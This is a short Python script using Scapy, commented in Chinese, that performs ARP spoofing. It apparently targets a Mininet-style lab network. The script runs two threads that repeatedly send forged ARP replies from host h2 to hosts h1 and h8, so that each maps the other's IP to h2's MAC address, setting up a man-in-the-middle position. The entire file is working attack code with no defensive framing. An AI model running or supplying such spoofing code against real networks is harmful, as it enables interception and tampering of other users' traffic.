#!/usr/bin/env python3
# ARP欺骗攻击：h2欺骗h1和h8，使h8的MAC地址显示为h2的MAC地址
from scapy.all import ARP, Ether, sendp
import threading
import time

IFACE = "h2-eth0"  # h2的网络接口
H2_MAC = "00:00:00:00:00:02"  # h2的MAC地址
H1_IP = "192.168.1.100"  # h1的IP地址
H1_MAC = "00:00:00:00:00:01"  # h1的MAC地址
H8_IP = "192.168.1.108"  # h8的IP地址
H8_MAC = "00:00:00:00:00:08"  # h8的MAC地址

def spoof_h1_about_h8():
    """向h1发送ARP回复，告诉h1：h8的MAC地址是h2的MAC地址"""
    while True:
        # 构造ARP回复包：告诉h1，h8的IP对应h2的MAC
        pkt = Ether(dst=H1_MAC, src=H2_MAC) / \
              ARP(op=2,  # ARP回复
                  hwsrc=H2_MAC,  # 源MAC：h2的MAC
                  psrc=H8_IP,   # 源IP：h8的IP
                  hwdst=H1_MAC,  # 目标MAC：h1的MAC
                  pdst=H1_IP)    # 目标IP：h1的IP
        sendp(pkt, iface=IFACE, verbose=0)
        time.sleep(1)  # 每秒发送一次

def spoof_h8_about_h1():
    """向h8发送ARP回复，告诉h8：h1的MAC地址是h2的MAC地址"""
    while True:
        # 构造ARP回复包：告诉h8，h1的IP对应h2的MAC
        pkt = Ether(dst=H8_MAC, src=H2_MAC) / \
              ARP(op=2,  # ARP回复
                  hwsrc=H2_MAC,  # 源MAC：h2的MAC
                  psrc=H1_IP,   # 源IP：h1的IP
                  hwdst=H8_MAC,  # 目标MAC：h8的MAC
                  pdst=H8_IP)    # 目标IP：h8的IP
        sendp(pkt, iface=IFACE, verbose=0)
        time.sleep(1)  # 每秒发送一次

def main():
    print("[+] 开始ARP欺骗攻击：h2欺骗h1和h8")
    print("[+] h1会认为h8的MAC是h2的MAC")
    print("[+] h8会认为h1的MAC是h2的MAC")
    
    # 启动两个线程分别欺骗h1和h8
    t1 = threading.Thread(target=spoof_h1_about_h8, daemon=True)
    t2 = threading.Thread(target=spoof_h8_about_h1, daemon=True)
    
    t1.start()
    t2.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] ARP欺骗攻击已停止")

if __name__ == "__main__":
    main()
